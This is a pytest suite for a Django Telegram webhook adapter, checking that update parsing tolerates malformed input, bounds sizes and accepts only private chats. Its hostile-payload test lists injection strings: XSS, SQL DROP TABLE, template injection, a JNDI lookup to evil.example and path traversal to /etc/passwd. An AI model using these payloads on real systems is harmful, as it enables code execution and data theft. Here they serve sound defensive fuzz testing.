"""Parsing Telegram updates — the recorded shapes, and the hostile ones.

SECURITY-BASELINE §2 makes both halves mandatory: "webhook payload parsing is
defensive: type-check every field, tolerate missing/extra keys, cap sizes.
Fixture suites must include malformed and hostile payloads (oversized, wrong
types, script/injection strings in every string field)."

The contract ``parse_events`` is held to here is narrow and absolute: **it never
raises**, whatever arrives. One malformed event must not cost a whole delivery,
and the endpoint's own catch-all (``views_webhooks._parse_events``) is a
backstop for our bugs, not a licence for the parser to throw.
"""

import json
from typing import Any, cast

import pytest
from django.http import HttpRequest
from django.test import RequestFactory

from apps.channels.events import EventType
from apps.channels.models import ChannelConnection
from apps.channels.providers import telegram as telegram_module
from apps.channels.providers.telegram import (
    ANSWER_CALLBACK_ACTION,
    MAX_INBOUND_TEXT_CHARS,
    SECRET_HEADER,
    TelegramAdapter,
    store_bot_token,
)
from apps.channels.tests.telegram_support import BOT_TOKEN, fake_bot_api, load_update
from apps.queueing.models import ScheduledAction
from apps.queueing.registry import get_handler

pytestmark = pytest.mark.django_db


def request_for(update: Any, *, secret: str = "not-the-real-one") -> HttpRequest:  # noqa: S107 - a test value
    """A request shaped the way the webhook endpoint hands one to an adapter."""
    body = update if isinstance(update, bytes) else json.dumps(update).encode()
    request = RequestFactory().post("/webhooks/telegram/", data=body, content_type="application/json")
    # `headers` is a cached read-only view over META, so the secret goes in the
    # way a real request carries it and the view is rebuilt from it.
    request.META["HTTP_" + SECRET_HEADER.upper().replace("-", "_")] = secret
    return request


def _answer_handler() -> Any:
    """The registered handler for the deferred callback answer."""
    handler = get_handler(ANSWER_CALLBACK_ACTION)
    assert handler is not None, "the adapter module registers it on import"
    return handler


def parse(update: Any, connection: ChannelConnection) -> list[Any]:
    return TelegramAdapter().parse_events(request_for(update), connection)


@pytest.fixture
def telegram_connection(connection: ChannelConnection) -> ChannelConnection:
    """The shared Telegram connection, with a bot token on it."""
    store_bot_token(connection, BOT_TOKEN)
    connection.save(update_fields=["credentials", "updated_at"])
    return connection


class TestRecordedShapes:
    """One recorded update per inbound shape the issue lists."""

    def test_text(self, telegram_connection: ChannelConnection) -> None:
        (event,) = parse(load_update("message_text"), telegram_connection)
        assert event.type == EventType.MESSAGE
        assert event.platform_user_id == "5150"
        assert event.payload.text == "Do you deliver to Berlin?"
        # update_id, not a content hash: Telegram supplies a stable per-update
        # id, so a redelivery of the same update deduplicates (SPEC §7.1).
        assert event.provider_event_id == "tg:900001"
        assert event.payload.extra["username"] == "ada"

    def test_bare_start_is_a_message_that_announces_itself(self, telegram_connection: ChannelConnection) -> None:
        """SPEC §10's welcome trigger is a *trigger* type; EventType has no
        `welcome`. The contact did send a message, so it stays one — and carries
        a flag, so L4-A keys off that rather than matching the text."""
        (event,) = parse(load_update("message_start_bare"), telegram_connection)
        assert event.type == EventType.MESSAGE
        assert event.payload.text == "/start"
        assert event.payload.extra["command"] == "start"
        assert event.payload.ref == ""

    def test_start_with_a_payload_is_a_referral(self, telegram_connection: ChannelConnection) -> None:
        (event,) = parse(load_update("message_start_ref"), telegram_connection)
        assert event.type == EventType.REFERRAL
        assert event.payload.ref == "spring-sale"
        # Not also a message: SPEC §10 routes this to the ref_url trigger.
        assert event.payload.text == ""

    def test_photo_keeps_the_largest_size_only(self, telegram_connection: ChannelConnection) -> None:
        (event,) = parse(load_update("message_photo"), telegram_connection)
        # Telegram sends every size it made. One id per photo is what a consumer
        # wants, and the largest is the one worth having.
        assert event.payload.media_ids == ("AgAClargest",)
        assert event.payload.text == "Here is the receipt"
        # file_ids are not URLs and are never put where a URL is expected —
        # attachments is documented as URLs (SECURITY-BASELINE §6).
        assert event.payload.attachments == ()

    @pytest.mark.parametrize(
        ("fixture", "file_id"),
        [
            ("message_audio", "AwACvoice"),
            ("message_video", "BAACvideo"),
            ("message_document", "BQACdoc"),
        ],
    )
    def test_media_kinds(self, telegram_connection: ChannelConnection, fixture: str, file_id: str) -> None:
        (event,) = parse(load_update(fixture), telegram_connection)
        assert event.type == EventType.MESSAGE
        assert event.payload.media_ids == (file_id,)

    def test_contact_falls_back_to_text(self, telegram_connection: ChannelConnection) -> None:
        (event,) = parse(load_update("message_contact"), telegram_connection)
        assert "Grace Hopper" in event.payload.text
        assert "+493012345678" in event.payload.text

    def test_location_falls_back_to_text(self, telegram_connection: ChannelConnection) -> None:
        (event,) = parse(load_update("message_location"), telegram_connection)
        assert "52.520008" in event.payload.text
        assert "13.404954" in event.payload.text

    def test_callback_query_becomes_a_postback(self, telegram_connection: ChannelConnection) -> None:
        with fake_bot_api() as fake:
            (event,) = parse(load_update("callback_query"), telegram_connection)
        assert event.type == EventType.POSTBACK
        # The button half of SPEC §6.2's node_id:button_id. The engine matches
        # this against the waiting node's handles.
        assert event.payload.button_id == "btn_yes"
        assert event.payload.extra["callback_data"] == "node_ask:btn_yes"
        assert event.platform_user_id == "5150"
        # The spinner is answered off the ack path: an inline Bot API round trip
        # here would sit inside SPEC §7.1's 1.5 s inline budget and the Layer-4
        # gate's 500 ms webhook ack, on the commonest interaction there is.
        assert fake.calls == []
        queued = ScheduledAction.objects.unscoped().get(type=ANSWER_CALLBACK_ACTION)
        assert queued.payload["callback_query_id"] == "4382bfdwdsb323b2d9"

    def test_the_queued_answer_actually_answers(self, telegram_connection: ChannelConnection) -> None:
        """Deferring it is only worth anything if the worker completes it."""
        with fake_bot_api():
            parse(load_update("callback_query"), telegram_connection)
        action = ScheduledAction.objects.unscoped().get(type=ANSWER_CALLBACK_ACTION)

        with fake_bot_api() as fake:
            _answer_handler()(action.payload, action)

        assert fake.payloads("answerCallbackQuery") == [{"callback_query_id": "4382bfdwdsb323b2d9"}]

    def test_a_redelivered_press_does_not_enqueue_a_second_answer(self, telegram_connection: ChannelConnection) -> None:
        with fake_bot_api():
            parse(load_update("callback_query"), telegram_connection)
            parse(load_update("callback_query"), telegram_connection)
        assert ScheduledAction.objects.unscoped().filter(type=ANSWER_CALLBACK_ACTION).count() == 1

    def test_the_handler_ignores_a_payload_naming_no_connection(self) -> None:
        """The ids in the row came from a webhook; the handler re-reads rather
        than trusting, so a payload naming nothing does nothing."""
        nowhere = cast(Any, None)
        with fake_bot_api() as fake:
            _answer_handler()(
                {"connection_id": "01a02b7f-0000-7000-0000-000000000000", "callback_query_id": "x"}, nowhere
            )
            _answer_handler()({"callback_query_id": 17}, nowhere)
        assert fake.calls == []

    def test_a_failed_callback_answer_does_not_lose_the_press(
        self, telegram_connection: ChannelConnection, monkeypatch: Any
    ) -> None:
        """The spinner is cosmetic; the press is not. views_webhooks drops the
        whole delivery if parse_events raises, so this must not."""

        def explode(*args: Any, **kwargs: Any) -> None:
            raise RuntimeError("the queue is down")

        monkeypatch.setattr(telegram_module, "queue_schedule", explode)
        (event,) = parse(load_update("callback_query"), telegram_connection)
        assert event.payload.button_id == "btn_yes"

    def test_an_update_type_we_do_not_carry_is_dropped(self, telegram_connection: ChannelConnection) -> None:
        assert parse(load_update("unsupported_edited_message"), telegram_connection) == []


class TestCallbackDataShapes:
    """Both encodings _callback_data can produce have to parse back."""

    @pytest.mark.parametrize(
        ("data", "expected"),
        [
            ("node_ask:btn_yes", "btn_yes"),
            # The length fallback drops the node prefix; a bare id must still
            # resolve to itself.
            ("btn_yes", "btn_yes"),
            # Node ids cannot contain a colon (flows.schema.handles.HANDLE_PATTERN),
            # so splitting on the first one is unambiguous.
            ("n:a", "a"),
        ],
    )
    def test_button_id_is_recovered(self, telegram_connection: ChannelConnection, data: str, expected: str) -> None:
        update = load_update("callback_query")
        update["callback_query"]["data"] = data
        with fake_bot_api():
            (event,) = parse(update, telegram_connection)
        assert event.payload.button_id == expected

    def test_a_callback_query_with_no_data_is_dropped(self, telegram_connection: ChannelConnection) -> None:
        update = load_update("callback_query")
        update["callback_query"]["data"] = ""
        with fake_bot_api():
            assert parse(update, telegram_connection) == []


class TestHostilePayloads:
    """SECURITY-BASELINE §2's required set. Nothing here may raise."""

    #: Strings chosen to break a consumer that forgets to escape, quote or bound.
    #: The last is a right-to-left override, which reverses how a filename
    #: renders in anything that does not neutralise it.
    INJECTIONS = (
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "'; DROP TABLE contacts; --",
        "{{ 7*7 }}",
        "${jndi:ldap://evil.example/a}",
        "../../../../etc/passwd",
        "\x00\x00\x00",
        "‮ gnp.exe",
    )

    def test_every_string_field_survives_an_injection_string(self, telegram_connection: ChannelConnection) -> None:
        """Every string in a message, one hostile value at a time.

        The adapter's job is not to sanitise — escaping belongs on render
        (SECURITY-BASELINE §2) — it is to carry the value without choking and
        without letting it become something structural.
        """
        for payload in self.INJECTIONS:
            update = load_update("message_text")
            update["message"]["text"] = payload
            update["message"]["from"]["username"] = payload
            update["message"]["from"]["first_name"] = payload
            # chat.type is not fuzzed here: it is the private-chat gate, and
            # TestPrivateChatsOnly covers what a hostile value in it does.
            update["message"]["from"]["language_code"] = payload
            events = parse(update, telegram_connection)
            assert len(events) == 1, payload
            # Carried, not interpreted, and never long enough to be a problem.
            assert len(events[0].payload.extra.get("username", "")) <= 200

    def test_wrong_types_everywhere(self, telegram_connection: ChannelConnection) -> None:
        """Every field holding the wrong kind of value at once."""
        update = {
            "update_id": 900500,
            "message": {
                "message_id": "not-an-int",
                "from": ["not", "a", "dict"],
                "chat": {"id": {"nested": "object"}, "type": 42},
                "date": "yesterday",
                "text": {"not": "a string"},
                "photo": "not a list",
                "document": "not a dict",
                "contact": 17,
                "location": {"latitude": "north", "longitude": None},
            },
        }
        # A chat id that is not a number leaves nothing to address, so the event
        # is dropped — but quietly, not by raising.
        assert parse(update, telegram_connection) == []

    def test_a_usable_chat_id_with_everything_else_wrong_still_parses(
        self, telegram_connection: ChannelConnection
    ) -> None:
        update = {
            "update_id": 900501,
            "message": {
                "chat": {"id": 5150, "type": "private"},
                "date": None,
                "text": "hi",
                "photo": {},
                "from": None,
            },
        }
        (event,) = parse(update, telegram_connection)
        assert event.payload.text == "hi"
        assert event.payload.media_ids == ()
        # No date it could believe, so it stamps its own rather than dropping
        # the message over a cosmetic field.
        assert event.timestamp is not None

    def test_oversized_text_is_bounded(self, telegram_connection: ChannelConnection) -> None:
        update = load_update("message_text")
        update["message"]["text"] = "A" * 100_000
        (event,) = parse(update, telegram_connection)
        assert len(event.payload.text) == MAX_INBOUND_TEXT_CHARS

    def test_an_oversized_ref_is_bounded(self, telegram_connection: ChannelConnection) -> None:
        update = load_update("message_start_ref")
        update["message"]["text"] = "/start " + "r" * 5_000
        (event,) = parse(update, telegram_connection)
        assert event.type == EventType.REFERRAL
        # A real deep-link payload cannot exceed 64 characters, so anything
        # longer did not come from one.
        assert len(event.payload.ref) == 64

    def test_a_wildly_long_media_id_list_is_bounded_per_field(self, telegram_connection: ChannelConnection) -> None:
        update = load_update("message_photo")
        update["message"]["photo"] = [{"file_id": "x" * 5_000}] * 50
        (event,) = parse(update, telegram_connection)
        # One id per media field, and that id is bounded.
        assert len(event.payload.media_ids) == 1
        assert len(event.payload.media_ids[0]) == 200

    @pytest.mark.parametrize(
        "update",
        [
            {},
            {"update_id": 1},
            {"update_id": None, "message": {"chat": {"id": 1, "type": "private"}, "text": "hi"}},
            {"update_id": True, "message": {"chat": {"id": 1, "type": "private"}, "text": "hi"}},
            {"update_id": 1, "message": None},
            {"update_id": 1, "message": []},
            {"update_id": 1, "callback_query": "nope"},
            {"update_id": 1, "message": {"chat": None}},
            {"update_id": 1, "message": {"chat": {"id": True, "type": "private"}}},
            {"update_id": 1, "message": {"chat": {"id": 1, "type": "private"}}},
            [1, 2, 3],
            "a string",
            None,
        ],
    )
    def test_nothing_raises_and_nothing_half_parses(self, telegram_connection: ChannelConnection, update: Any) -> None:
        assert parse(update, telegram_connection) == []

    def test_a_nesting_bomb_is_refused_before_the_adapter_sees_it(self, telegram_connection: ChannelConnection) -> None:
        """The shared parser is what stops this, and the adapter degrades to nothing.

        ``security.json_payload`` enforces ``WEBHOOK_MAX_JSON_DEPTH`` and returns
        None past it, so the adapter reads an empty payload and produces no
        events. Worth pinning from this side too: if that guard were ever
        loosened, this test says who was relying on it.
        """
        nested: Any = {"file_id": "deep"}
        for _ in range(200):
            nested = {"inner": nested}
        update = {"update_id": 900502, "message": {"chat": {"id": 5150}, "text": "hi", "document": nested}}
        assert parse(update, telegram_connection) == []

    def test_nesting_under_the_cap_is_walked_without_recursing(self, telegram_connection: ChannelConnection) -> None:
        """And the adapter's own walk is flat, so a legal-but-nested media
        object is simply not a file_id rather than a stack frame per level."""
        nested: Any = {"file_id": "deep"}
        for _ in range(10):
            nested = {"inner": nested}
        update = {
            "update_id": 900503,
            "message": {"chat": {"id": 5150, "type": "private"}, "text": "hi", "document": nested},
        }
        (event,) = parse(update, telegram_connection)
        assert event.payload.media_ids == ()
        assert event.payload.text == "hi"

    def test_a_body_that_is_not_json_yields_nothing(self, telegram_connection: ChannelConnection) -> None:
        request = request_for(b"not json at all")
        assert TelegramAdapter().parse_events(request, telegram_connection) == []


class TestWebhookVerification:
    def test_the_right_secret_verifies(self, telegram_connection: ChannelConnection, secret: str) -> None:
        assert TelegramAdapter().verify_webhook(request_for({}, secret=secret), telegram_connection) is True

    @pytest.mark.parametrize("presented", ["", "wrong", "                                           "])
    def test_anything_else_does_not(self, telegram_connection: ChannelConnection, presented: str) -> None:
        assert TelegramAdapter().verify_webhook(request_for({}, secret=presented), telegram_connection) is False

    def test_the_connection_is_resolved_from_the_header(
        self, telegram_connection: ChannelConnection, secret: str
    ) -> None:
        resolved = TelegramAdapter().resolve_connection(request_for({}, secret=secret), b"{}")
        assert resolved is not None
        assert resolved.pk == telegram_connection.pk

    def test_an_unknown_secret_resolves_to_nothing(self, telegram_connection: ChannelConnection) -> None:
        assert TelegramAdapter().resolve_connection(request_for({}, secret="nope"), b"{}") is None


class TestPrivateChatsOnly:
    """Groups are out of scope, and half-supporting them is the dangerous option.

    A bot added to a group keeps receiving ``message`` updates whose ``chat`` is
    the group. Taking that as the ``platform_user_id`` would make one contact
    and one conversation shared by everyone in the room: automation written for
    one person delivered to a crowd, and a crowd's messages filed against one
    stranger's record.
    """

    @pytest.mark.parametrize("chat_type", ["group", "supergroup", "channel", "sender", ""])
    def test_a_non_private_chat_produces_nothing(self, telegram_connection: ChannelConnection, chat_type: str) -> None:
        update = load_update("message_text")
        update["message"]["chat"]["type"] = chat_type
        assert parse(update, telegram_connection) == []

    def test_a_chat_with_no_type_is_refused(self, telegram_connection: ChannelConnection) -> None:
        """Fails closed. ``chat.type`` is required by Telegram's own schema, so a
        payload without one did not come from Telegram — and guessing on its
        behalf is the wrong instinct for a privacy gate."""
        update = load_update("message_text")
        del update["message"]["chat"]["type"]
        assert parse(update, telegram_connection) == []

    def test_a_group_start_does_not_become_a_referral(self, telegram_connection: ChannelConnection) -> None:
        """The deep-link path has to be gated too, or a preview link pasted into
        a group would bind the group as the tester."""
        update = load_update("message_start_ref")
        update["message"]["chat"]["type"] = "supergroup"
        assert parse(update, telegram_connection) == []

    def test_a_group_button_press_produces_nothing(self, telegram_connection: ChannelConnection) -> None:
        update = load_update("callback_query")
        update["callback_query"]["message"]["chat"]["type"] = "group"
        with fake_bot_api() as fake:
            assert parse(update, telegram_connection) == []
        # And no spinner answer either: nothing about the press was accepted.
        assert fake.calls == []
        assert not ScheduledAction.objects.unscoped().filter(type=ANSWER_CALLBACK_ACTION).exists()

    def test_a_press_with_no_source_message_produces_nothing(self, telegram_connection: ChannelConnection) -> None:
        """There is no fallback to ``callback_query.from``: a User carries no
        ``type``, so it cannot be checked against the private-chat rule and a
        group press would come back through it looking private."""
        update = load_update("callback_query")
        del update["callback_query"]["message"]
        with fake_bot_api():
            assert parse(update, telegram_connection) == []
